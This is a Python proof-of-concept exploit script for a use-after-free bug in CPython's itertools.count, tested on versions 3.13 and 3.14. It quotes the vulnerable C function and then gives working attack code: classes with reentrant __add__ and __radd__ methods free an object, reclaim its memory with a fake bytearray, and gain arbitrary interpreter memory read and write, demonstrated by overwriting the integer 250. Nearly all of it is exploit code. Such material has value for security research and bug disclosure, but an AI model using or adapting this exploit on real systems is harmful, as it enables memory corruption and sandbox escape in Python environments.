"""
Author: @Nico-Posada
Bug Credits: @Nico-Posada
"""

# TLDR: Exploit PyNumber_Add being used without doing proper increfs allowing a UAF
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Modules/itertoolsmodule.c#L3472-L3492
"""
static PyObject *
count_nextlong(countobject *lz)
{
    PyObject *long_cnt;
    PyObject *stepped_up;

    long_cnt = lz->long_cnt;
    if (long_cnt == NULL) {
        /* Switch to slow_mode */
        long_cnt = PyLong_FromSsize_t(PY_SSIZE_T_MAX);
        if (long_cnt == NULL)
            return NULL;
    }
    assert(lz->cnt == PY_SSIZE_T_MAX && long_cnt != NULL);

    stepped_up = PyNumber_Add(long_cnt, lz->long_step); // <--- doesn't incref either value before calling
    if (stepped_up == NULL)
        return NULL;
    lz->long_cnt = stepped_up; // <--- sets ref
    return long_cnt;
}
"""

# So the plan of attack here is to create a special __add__ function that will reenter the function
# to cause lz->long_cnt to be overwritten and deleted prematurely. Once deleted, we can do the NotImplemented
# trick to pass our deleted object to a receiver function to grab the evil object.

from itertools import count
from common import evil_bytearray_obj

class evilcnt(bytes):
    lock = False

    # needs an __index__ func to not error
    def __index__(self):
        return 1
    
    def __add__(self, other):
        global _ref
        if evilcnt.lock:
            return 0

        # reenter, will take path to return 0 causing the function to finish and
        # lz->long_step (`self` in this func) to lose a ref, meaning the only
        # ref left after this call will be `self`
        evilcnt.lock = True
        next(x)
        evilcnt.lock = False

        # delete the final ref as explained above
        del self

        # now lz->long_step is freed, so reclaim the memory with our fake bytearray
        _ref = fake_obj.ljust(SIZE, b"\0")

        # returning NotImplemented will cause the evilstep.__radd__ function to be 
        # called with our fake bytearray as the `other` arg
        return NotImplemented

class evilstep:
    # needs an __index__ func to not error
    def __index__(self):
        return 1

    def __radd__(self, other):
        global mem
        mem = other
        return 1

# see ./common/common.py for evil bytearray obj explanation
fake_obj, _ = evil_bytearray_obj()

SIZE = 0x100
x = count(evilcnt(SIZE - 0x18), evilstep())

mem = None
next(x)
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100